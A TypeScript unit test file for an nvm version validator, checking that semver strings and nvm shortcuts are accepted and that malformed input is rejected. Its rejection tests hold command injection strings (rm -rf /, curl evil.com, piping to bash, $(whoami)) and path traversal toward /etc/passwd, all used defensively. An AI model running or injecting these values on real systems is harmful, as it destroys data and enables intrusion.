import { strictEqual, throws } from 'assert';
import { isValidVersion, sanitizeVersion } from '../../../extension/core/nvm/versionValidator';

describe('versionValidator', () => {
    describe('isValidVersion', () => {
        it('should accept valid semver versions', () => {
            strictEqual(isValidVersion('18.0.0'), true);
            strictEqual(isValidVersion('20.12.2'), true);
            strictEqual(isValidVersion('0.0.1'), true);
            strictEqual(isValidVersion('100.200.300'), true);
        });

        it('should accept nvm shortcuts', () => {
            strictEqual(isValidVersion('lts/*'), true);
            strictEqual(isValidVersion('lts/fermium'), true);
            strictEqual(isValidVersion('lts/hydrogen'), true);
            strictEqual(isValidVersion('node'), true);
            strictEqual(isValidVersion('system'), true);
            strictEqual(isValidVersion('latest'), true);
        });

        it('should accept versions with leading/trailing whitespace', () => {
            strictEqual(isValidVersion('  18.0.0  '), true);
            strictEqual(isValidVersion('\t20.12.2\n'), true);
        });

        it('should reject empty strings', () => {
            strictEqual(isValidVersion(''), false);
        });

        it('should reject null/undefined', () => {
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            strictEqual(isValidVersion(null as any), false);
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            strictEqual(isValidVersion(undefined as any), false);
        });

        it('should reject command injection attempts', () => {
            strictEqual(isValidVersion('18.0.0; rm -rf /'), false);
            strictEqual(isValidVersion('18.0.0 && curl evil.com'), false);
            strictEqual(isValidVersion('18.0.0 | bash'), false);
            strictEqual(isValidVersion('18.0.0$(whoami)'), false);
            strictEqual(isValidVersion('18.0.0`id`'), false);
            strictEqual(isValidVersion('${IFS}rm${IFS}-rf${IFS}/'), false);
        });

        it('should reject invalid version formats', () => {
            strictEqual(isValidVersion('v18.0.0'), false);
            strictEqual(isValidVersion('18.0'), false);
            strictEqual(isValidVersion('18'), false);
            strictEqual(isValidVersion('abc'), false);
            strictEqual(isValidVersion('18.0.0.0'), false);
        });

        it('should reject path traversal attempts', () => {
            strictEqual(isValidVersion('../../../etc/passwd'), false);
            strictEqual(isValidVersion('..\\\\windows\\\\system32'), false);
        });
    });

    describe('sanitizeVersion', () => {
        it('should return trimmed valid version', () => {
            strictEqual(sanitizeVersion('  18.0.0  '), '18.0.0');
            strictEqual(sanitizeVersion('20.12.2'), '20.12.2');
        });

        it('should return trimmed nvm shortcuts', () => {
            strictEqual(sanitizeVersion('  lts/*  '), 'lts/*');
            strictEqual(sanitizeVersion('node'), 'node');
        });

        it('should throw on invalid version', () => {
            throws(() => sanitizeVersion('18.0.0; rm -rf /'), /Invalid version format/);
            throws(() => sanitizeVersion(''), /Invalid version format/);
            throws(() => sanitizeVersion('abc'), /Invalid version format/);
        });

        it('should throw on injection attempts', () => {
            throws(() => sanitizeVersion('18.0.0 && curl evil.com'), /Invalid version format/);
            throws(() => sanitizeVersion('18.0.0|bash'), /Invalid version format/);
        });
    });
});
